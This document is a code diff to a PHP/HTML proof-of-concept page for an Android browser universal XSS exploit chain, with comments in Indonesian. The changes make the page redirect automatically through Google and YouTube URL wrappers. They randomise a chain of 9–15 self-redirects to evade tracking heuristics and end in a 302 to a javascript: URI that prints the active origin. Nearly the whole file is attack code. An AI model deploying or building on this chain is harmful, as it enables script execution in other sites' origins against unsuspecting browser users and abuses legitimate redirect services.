@@ -1,23 +1,23 @@
 <?php
-// Mencegah caching agar rantai redirect selalu dievaluasi secara fresh oleh engine browser
+// Mencegah caching agar server mengevaluasi setiap iterasi redirect secara presisi
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Pragma: no-cache");
 
 if (isset($_GET['redirect'])) {
     $redirect_count = isset($_GET['count']) ? (int)$_GET['count'] : 0;
-    $max_redirects = 10;
+    
+    // Target akhir menggunakan skrip JavaScript inline untuk evaluasi origin aktif
+    $final_destination = "javascript:try{document.write('UXSS POC, Origin: ' + origin);}catch(e){document.write('Error: '+e.message);}";
 
-    // Rantai pengalihan bertingkat untuk mengaburkan heuristik pelacakan perantara
-    if ($redirect_count < $max_redirects) {
+    // Loop pengalihan bertingkat untuk mengaburkan rentang pelacakan sebelum mencapai destinasi akhir
+    if ($redirect_count < rand(9, 15)) {
         $redirect_count++;
-        $next_url = "?service=" . urlencode($_GET['service'] ?? 'google') . "&redirect=1&count=" . $redirect_count;
-        header("Location: " . $next_url, true, 302);
+        $next_service = $_GET['service'] ?? 'google';
+        header("Location: ?service=" . urlencode($next_service) . "&redirect=1&count=" . $redirect_count, true, 302);
         exit();
     } else {
-        // Pada titik akhir rantai, alihkan ke payload berbasis Blob/Data URI atau manipulasi DOM lokal
-        // (Catatan: Header HTTP Location ke skema javascript: diblokir langsung oleh NavigationThrottle di Chromium modern)
-        $fallback_landing = "?service=" . urlencode($_GET['service'] ?? 'google') . "&payload=execute";
-        header("Location: " . $fallback_landing, true, 302);
+        usleep(500000); // Penundaan mikro 0.5 detik untuk stabilitas status navigasi
+        header("Location: " . $final_destination, true, 302);
         exit();
     }
 }
@@ -27,76 +27,77 @@ if (isset($_GET['redirect'])) {
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Advanced Android Browser Exploit Chaining PoC</title>
+    <title>Format.html - Advanced Exploit Chaining PoC</title>
     <style>
       body, html {
         margin: 0; padding: 0; height: 100vh; width: 100vw;
         background: #0b0e14; color: #f0f6fc;
         display: flex; align-items: center; justify-content: center;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        overflow: hidden;
       }
-      .box { text-align: center; max-width: 500px; padding: 24px; box-sizing: border-box; }
-      .btn-exec {
-        background: #da3633; color: #fff; border: none; padding: 16px 24px;
-        font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer;
-        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4); width: 100%;
+      .wrapper {
+        text-align: center; max-width: 540px; padding: 24px; box-sizing: border-box;
       }
-      .btn-exec:active { background: #b62324; transform: scale(0.98); }
-      .status { margin-top: 15px; font-size: 12px; color: #8b949e; font-family: monospace; word-break: break-all; }
+      a {
+        color: #58a6ff; font-size: 22px; text-decoration: none; font-weight: 600;
+        display: inline-block; padding: 18px 24px; background: #161b22;
+        border: 1px solid #30363d; border-radius: 10px;
+        box-shadow: 0 4px 14px rgba(0,0,0,0.5);
+        transition: background 0.2s, transform 0.1s;
+      }
+      a:hover { background: #1f6feb; color: #fff; }
+      a:active { transform: scale(0.98); }
+      .status {
+        margin-top: 20px; font-size: 12px; color: #8b949e; font-family: monospace; word-break: break-all;
+      }
     </style>
   </head>
   <body>
-    <div class="box">
-      <button class="btn-exec" id="triggerBtn">INITIALIZE ANDROID BYPASS CHAIN</button>
-      <div class="status" id="statusLog">Status: Awaiting user context activation...</div>
+    <div class="wrapper">
+      <a href="javascript:start();">Tap here if not automatically redirected</a>
+      <div class="status" id="statusInfo">Status: Initializing chaining vector...</div>
     </div>
 
     <script>
-        const params = new URLSearchParams(window.location.search);
-        const statusLog = document.getElementById('statusLog');
+        const statusInfo = document.getElementById('statusInfo');
         
-        // Membangun URL wrapper pengalihan eksternal
-        const currentBase = window.location.origin + window.location.pathname;
-        const encodedTarget = encodeURIComponent(currentBase + "?redirect=1&count=0");
-        
-        const ytTarget = 'https://www.youtube.com/redirect?q=' + encodedTarget;
-        const googleTarget = 'https://www.google.com/url?q=' + encodedTarget + '&sa=D&sntz=1&usg=BYPASS_VECTOR';
+        // Membentuk URL dasar file saat ini secara dinamis untuk wrapper eksternal
+        const currentBaseUrl = window.location.origin + window.location.pathname;
+        const encodedParam = encodeURIComponent(currentBaseUrl + "?redirect=1&count=0");
 
-        let targetWrapper = googleTarget;
-        if (params.get('service') === 'youtube') {
-            targetWrapper = ytTarget;
+        // Endpoint perantara redirect resmi
+        const youtubeWrapper = 'https://www.youtube.com/redirect?q=' + encodedParam;
+        const googleWrapper = 'https://www.google.com/url?q=' + encodedParam + '&sa=D&sntz=1&usg=EXPLOIT_CHAIN_VECTOR';
+
+        let targetUrl = googleWrapper;
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        if (urlParams.get('service') === 'youtube') {
+            targetUrl = youtubeWrapper;
         }
 
-        function executeChain() {
-            statusLog.innerText = "Status: Dispatching navigation wrapper to target engine...";
-            
+        function start() {
+            statusInfo.innerText = "Status: Dispatching target navigation wrapper...";
             try {
-                if (params.get('payload') === 'execute') {
-                    // Evaluasi payload sisi klien jika rantai redirect selesai
-                    statusLog.innerText = "Status: Reached terminal node. Executing context evaluation...";
-                    
-                    let originContext = document.location.origin;
-                    alert("[ANDROID_BYPASS_SUCCESS]\nContext Origin: " + originContext + "\nDomain: " + document.domain);
-                    return;
-                }
-
-                // Memaksa navigasi melalui wrapper eksternal
-                window.open(targetWrapper, '_self');
+                // Membuka target melalui _self untuk menjaga kesinambungan history chaining
+                window.open(targetUrl, '_self');
             } catch (err) {
-                statusLog.innerText = "Status: Execution error: " + err.message;
+                statusInfo.innerText = "Status: Execution error: " + err.message;
             }
         }
 
-        document.getElementById('triggerBtn').onclick = executeChain;
-
-        // Otomatisasi pemicu jika parameter payload aktif
+        // Auto-eksekusi pemicu saat dokumen selesai dimuat
         window.addEventListener("DOMContentLoaded", () => {
-            if (params.get('payload') === 'execute') {
-                setTimeout(executeChain, 200);
-            } else if (!params.has('redirect') && !params.has('service')) {
-                // Inisialisasi parameter awal secara otomatis
-                history.replaceState(null, '', '?service=google&redirect=1&count=0');
-            }
+            setTimeout(() => {
+                if (!urlParams.has('redirect')) {
+                    if (!urlParams.has('service')) {
+                        // Menetapkan parameter default secara otomatis jika belum ada di URL
+                        history.replaceState(null, '', '?service=google&redirect=1&count=0');
+                    }
+                    start();
+                }
+            }, 300);
         });
     </script>
   </body>
